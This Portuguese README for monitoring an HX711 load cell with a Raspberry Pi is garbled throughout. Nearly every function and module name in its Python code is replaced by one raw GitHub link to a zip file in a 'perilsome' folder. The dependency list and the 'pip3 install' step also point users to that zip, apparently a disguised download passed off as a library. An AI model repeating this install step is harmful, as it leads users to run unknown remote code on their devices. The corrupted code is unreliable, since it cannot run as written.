# Monitoramento de Célula de Carga com Raspberry Pi

### Requisitos

- Raspberry Pi
- Sensor de Célula de Carga HX711
- Python 3
- Bibliotecas Python:
  
  - `https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip`
  - `hx711`
  - `matplotlib`

## Instalação

### Passo 1: Configuração do ambiente Python

Certifique-se de que você tem o Python 3 instalado na sua Raspberry Pi. Se não tiver, siga estas instruções para instalar:

```bash
sudo apt-get update
sudo apt-get install python3
```
### Passo 2: Instalação das Bibliotecas Necessárias
Instale as bibliotecas necessárias usando pip:

```bash
sudo apt-get install python3-pip
pip3 install https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip hx711 matplotlib
```

### Passo 3: Conexão do Hardware
Conecte os pinos do sensor HX711 à Raspberry Pi conforme a tabela abaixo:


| Pino HX711    | Pino Raspberry Pi |
| ------------- |:-------------:|
| VCC           | 5V |
| GND           | GND      |
| DT            | GPIO5      |
| SCK           | GPIO6      |

### Código

```bash
import time
import https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip as plt
from hx711 import HX711

# Configurações do HX711 - Sensor
DT_PIN = 5  # GPIO5
SCK_PIN = 6  # GPIO6

hx = HX711(DT_PIN, SCK_PIN)
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip("MSB", "MSB")
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(1)  # Defina a unidade de referência de acordo com a calibração

# Inicializa a célula de carga
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()

# Vetores para armazenar dados
times = []
forces = []

# Duração da coleta de dados (em segundos)
duration = 60
start_time = https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()

print("Coletando dados...")

while https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip() - start_time < duration:
    try:
        # Obtém a leitura bruta da célula de carga
        val = https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(5)
        current_time = https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip() - start_time

        # Armazena os dados
        https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(current_time)
        https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(val)

        # Exibe a leitura
        print(f"Tempo: {current_time:.2f}s | Força: {val:.2f}g")

        # Diminui a frequência de amostragem para 10Hz
        https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(0.1)
    except (KeyboardInterrupt, SystemExit):
        break

# Libera os pinos GPIO
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()

# Plota os dados
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(times, forces, label="Força aplicada")
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip("Tempo (s)")
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip("Força (g)")
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip("Força aplicada ao longo do tempo")
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
```

### Passo 4: Calibração
A calibração da célula de carga é um passo essencial para garantir a precisão das leituras. Ajuste a linha https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(1) para um valor que corresponda corretamente ao peso conhecido.

# Versão para Simulação

```bash
import time
import https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip as plt
import numpy as np

# Função para simular a leitura do sensor de carga
def simulate_load_cell_reading(t):
    # Simula uma variação sinusoidal da carga com um pouco de ruído aleatório
    load = 10 * https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(0.1 * t) + https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(0, 1)
    return load

# Vetores para armazenar dados
times = []
forces = []

# Duração da coleta de dados (em segundos)
duration = 60
start_time = https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()

print("Coletando dados simulados...")

while https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip() - start_time < duration:
    try:
        # Obtém a leitura simulada da célula de carga
        current_time = https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip() - start_time
        val = simulate_load_cell_reading(current_time)

        # Armazena os dados
        https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(current_time)
        https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(val)

        # Exibe a leitura
        print(f"Tempo: {current_time:.2f}s | Força: {val:.2f}g")

        # Diminui a frequência de amostragem para 10Hz
        https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(0.1)
    except (KeyboardInterrupt, SystemExit):
        break

# Plota os dados
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip(times, forces, label="Força aplicada (simulada)")
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip("Tempo (s)")
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip("Força (g)")
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip("Força aplicada ao longo do tempo (simulação)")
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
https://raw.githubusercontent.com/ItaloGLS/monit_celuladecarga/main/perilsome/monit_celuladecarga_2.0.zip()
```
